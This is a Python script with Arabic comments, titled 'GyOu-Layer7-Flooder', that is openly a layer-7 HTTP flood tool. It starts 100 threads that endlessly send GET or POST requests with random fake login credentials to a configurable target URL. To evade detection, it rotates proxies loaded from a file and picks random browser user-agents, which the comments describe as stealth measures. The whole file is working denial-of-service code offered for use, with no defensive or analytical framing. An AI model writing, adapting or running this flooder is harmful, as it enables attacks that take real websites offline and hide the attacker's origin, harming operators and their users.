import threading
import requests
import random
import time

# تعريف معلومات حقوق الملكية
AUTHOR_NAME = "gyou"
TOOL_NAME = "GyOu-Layer7-Flooder"

# --- المتغيرات والتكوينات ---
URL = "http://target.com/login" # هدف الهجوم
METHOD = "POST" # الميثود المراد استخدامها (GET, POST, HEAD, إلخ)
THREADS = 100 # عدد سلاسل العمليات المتزامنة
SLEEP_TIME = 0.5 # تأخير بين كل دورة هجوم
TIMEOUT = 5 # مهلة الاتصال

# قائمة وهمية لرؤوس المتصفحات (للتخفي)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    # ... إضافة المزيد
]

# --- تحميل البروكسيات ---
def load_proxies(filename="proxies.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[{TOOL_NAME}] خطأ: لم يتم العثور على ملف {filename}.")
        return []

PROXY_LIST = load_proxies()

# --- وظيفة الهجوم الأساسية ---
def attack_thread(thread_id):
    while True:
        try:
            # 1. اختيار بروكسي عشوائي
            proxy_url = random.choice(PROXY_LIST)
            proxies = {
                'http': proxy_url,
                'https': proxy_url,
            }

            # 2. إنشاء رؤوس عشوائية
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Connection': 'keep-alive'
            }

            # 3. إعداد الحمولة (خاصة لـ POST)
            # مثال على حمولة لنموذج تسجيل دخول
            payload = {
                'username': f"testuser_{random.randint(1000, 9999)}",
                'password': f"fakepass_{random.randint(1000, 9999)}"
            }

            # 4. إرسال الطلب حسب الميثود
            if METHOD == "GET":
                response = requests.get(URL, headers=headers, proxies=proxies, timeout=TIMEOUT)
            elif METHOD == "POST":
                response = requests.post(URL, headers=headers, data=payload, proxies=proxies, timeout=TIMEOUT)
            # ... إضافة بقية الميثودات

            print(f"[{TOOL_NAME} - Thread {thread_id}] تم إرسال طلب {METHOD} عبر {proxy_url}. الحالة: {response.status_code}")

        except requests.exceptions.RequestException as e:
            # تجاهل الأخطاء (مثل تعطل البروكسي أو انتهاء المهلة) والاستمرار
            pass
        except IndexError:
            # يحدث إذا كانت قائمة البروكسيات فارغة
            print(f"[{TOOL_NAME}] انتهت البروكسيات، إيقاف Thread {thread_id}.")
            break

        time.sleep(SLEEP_TIME)

# --- وظيفة التشغيل الرئيسية ---
def start_attack():
    print(f"[{TOOL_NAME}] بدء الهجوم على {URL} باستخدام {METHOD} و {THREADS} Threads.")
    if not PROXY_LIST:
        print(f"[{TOOL_NAME}] تحذير: لا توجد بروكسيات محملة، سيتم استخدام IP المصدر مباشرة.")

    for i in range(THREADS):
        t = threading.Thread(target=attack_thread, args=(i,))
        t.daemon = True # يجعل سلاسل العمليات تتوقف عند توقف البرنامج الرئيسي
        t.start()

    # ترك الخيط الرئيسي يعمل للحفاظ على Threads
    while True:
        time.sleep(1)

if __name__ == "__main__":
    start_attack()
